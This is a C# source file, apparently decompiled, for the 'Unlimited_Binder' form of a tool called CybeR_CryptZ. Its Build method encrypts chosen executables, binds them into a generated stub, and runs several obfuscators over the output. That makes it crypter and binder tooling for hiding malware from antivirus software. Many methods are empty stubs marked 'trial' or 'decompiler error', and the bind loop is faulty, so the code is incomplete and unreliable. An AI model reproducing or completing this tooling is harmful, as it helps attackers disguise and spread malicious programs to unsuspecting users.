using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using CybeR_CryptZ.My;
using CybeR_CryptZ.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CybeR_CryptZ
{

    [DesignerGenerated]
    public class Unlimited_Binder : Form
    {

        [AccessedThroughProperty("ColumnHeader1")]
        private ColumnHeader _ColumnHeader1;
        [AccessedThroughProperty("ColumnHeader2")]
        private ColumnHeader _ColumnHeader2;
        [AccessedThroughProperty("ColumnHeader3")]
        private ColumnHeader _ColumnHeader3;
        [AccessedThroughProperty("ColumnHeader4")]
        private ColumnHeader _ColumnHeader4;
        [AccessedThroughProperty("ListView1")]
        private ListView _ListView1;
        [AccessedThroughProperty("RButton1")]
        private RButton _RButton1;
        [AccessedThroughProperty("RButton2")]
        private RButton _RButton2;
        [AccessedThroughProperty("RButton3")]
        private RButton _RButton3;
        [AccessedThroughProperty("RButton4")]
        private RButton _RButton4;
        [AccessedThroughProperty("RButtonRed2")]
        private RButtonRed _RButtonRed2;
        [AccessedThroughProperty("RTheme1")]
        private RTheme _RTheme1;
        private IContainer components;

        private static List<WeakReference> __ENCList;

        internal virtual ColumnHeader ColumnHeader1
        {
            get
            {
                return _ColumnHeader1;
            }
            set
            {
                _ColumnHeader1 = value;
            }
        }

        internal virtual ColumnHeader ColumnHeader2
        {
            get
            {
                return _ColumnHeader2;
            }
            set
            {
                _ColumnHeader2 = value;
            }
        }

        internal virtual ColumnHeader ColumnHeader3
        {
            get
            {
                return _ColumnHeader3;
            }
            set
            {
                _ColumnHeader3 = value;
            }
        }

        internal virtual ColumnHeader ColumnHeader4
        {
            get
            {
                return _ColumnHeader4;
            }
            set
            {
                _ColumnHeader4 = value;
            }
        }

        internal virtual ListView ListView1
        {
            get
            {
                return _ListView1;
            }
            set
            {
                _ListView1 = value;
            }
        }

        internal virtual RButton RButton1
        {
            get
            {
                return _RButton1;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton1_Click);
                bool flag = _RButton1 != null;
                if (flag)
                    _RButton1.Click -= eventHandler;
                _RButton1 = value;
                flag = _RButton1 != null;
                if (flag)
                    _RButton1.Click += eventHandler;
            }
        }

        internal virtual RButton RButton2
        {
            get
            {
                return _RButton2;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton2_Click);
                bool flag = _RButton2 != null;
                if (flag)
                    _RButton2.Click -= eventHandler;
                _RButton2 = value;
                flag = _RButton2 != null;
                if (flag)
                    _RButton2.Click += eventHandler;
            }
        }

        internal virtual RButton RButton3
        {
            get
            {
                return _RButton3;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton3_Click);
                bool flag = _RButton3 != null;
                if (flag)
                    _RButton3.Click -= eventHandler;
                _RButton3 = value;
                flag = _RButton3 != null;
                if (flag)
                    _RButton3.Click += eventHandler;
            }
        }

        internal virtual RButton RButton4
        {
            get
            {
                return _RButton4;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton4_Click);
                bool flag = _RButton4 != null;
                if (flag)
                    _RButton4.Click -= eventHandler;
                _RButton4 = value;
                flag = _RButton4 != null;
                if (flag)
                    _RButton4.Click += eventHandler;
            }
        }

        internal virtual RButtonRed RButtonRed2
        {
            get
            {
                return _RButtonRed2;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButtonRed2_Click);
                bool flag = _RButtonRed2 != null;
                if (flag)
                    _RButtonRed2.Click -= eventHandler;
                _RButtonRed2 = value;
                flag = _RButtonRed2 != null;
                if (flag)
                    _RButtonRed2.Click += eventHandler;
            }
        }

        internal virtual RTheme RTheme1
        {
            get
            {
                return _RTheme1;
            }
            set
            {
                _RTheme1 = value;
            }
        }

        [DebuggerNonUserCode]
        static Unlimited_Binder()
        {
            Unlimited_Binder.__ENCList = new List<WeakReference>();
        }

        [DebuggerNonUserCode]
        public Unlimited_Binder()
        {
            Unlimited_Binder.__ENCAddToList(this);
            InitializeComponent();
        }

        public void Build()
        {
            IEnumerator ienumerator;

            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.DefaultExt = "exe";
            saveFileDialog.Filter = "Executable Files (*.exe)|*.exe";
            bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
            if (flag)
            {
            }
            else
            {
                goto label_1;
            }
            string s5 = UnicodeGen(10, false);
            string s2 = UnicodeGen(10, false);
            string s3 = Resources.Main_Binder;
            string s4 = Resources.Binder_Stub;
            s4 = s4.Replace("Cyber_CrZ", s5);
            s4 = s4.Replace("polypasswordhere", s2);
            string s1 = String.Empty;
            ResourceWriter resourceWriter = new ResourceWriter("BindedResX.resources");
            try
            {
                resourceWriter.AddResource("RunM", Encoding.Default.GetString(Cyber_Z_CrypteR.pr0t0x0r.encrypt(Resources.RunResX, s2)));
                resourceWriter.AddResource("ReadR", Encoding.Default.GetString(Cyber_Z_CrypteR.pr0t0x0r.encrypt(Resources.ReadResX, s2)));
                resourceWriter.Generate();
            }
            finally
            {
                flag = resourceWriter != null;
                if (flag)
                    resourceWriter.Dispose();
            }
            iCompilerExe.GenExecutable(true, saveFileDialog.FileName, s4, null, "BindedResX.resources", null);
            try
            {
                ienumerator = ListView1.Items.GetEnumerator();
                while (flag)
                {
                    ListViewItem listViewItem = (ListViewItem)ienumerator.Current;
                    byte[] bArr2 = Cyber_Z_CrypteR.pr0t0x0r.encrypt(File.ReadAllBytes(listViewItem.SubItems[0].Text), s2);
                    string s6 = Convert.ToBase64String(bArr2);
                    s1 = s1 + s5 + s6;
                    flag = ienumerator.MoveNext();
                }
            }
            finally
            {
                flag = (ienumerator as IDisposable) != null;
                if (flag)
                    (ienumerator as IDisposable).Dispose();
            }
            byte[] bArr1 = Encoding.Default.GetBytes(s1);
            ResourceWriter.WriteResource(saveFileDialog.FileName, bArr1);
            File.Delete(Application.StartupPath + "\\BindedResX.resources");
            Obfuscator.NT_Headers(saveFileDialog.FileName);
            Obfuscator.Eazfuscator(saveFileDialog.FileName);
            Obfuscator.Dexcator(saveFileDialog.FileName);
            Interaction.MsgBox("Crypted !\r\nFiles Binded: " + Conversions.ToString(ListView1.Items.Count), MsgBoxStyle.ApplicationModal, null);
        label_1:;
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            // trial
        }

        private void RButton1_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton2_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton3_Click(object sender, EventArgs e)
        {
            // decompiler error
        }

        private void RButton4_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButtonRed2_Click(object sender, EventArgs e)
        {
            Close();
            MyProject.Forms.Main.Show();
        }

        public string SetBytes(object Bytes)
        {
            // decompiler error
        }

        public string UnicodeGen(int HowMany, bool Unicode)
        {
            // trial
            return null;
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            // decompiler error
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            // trial
        }

    } // class Unlimited_Binder

}

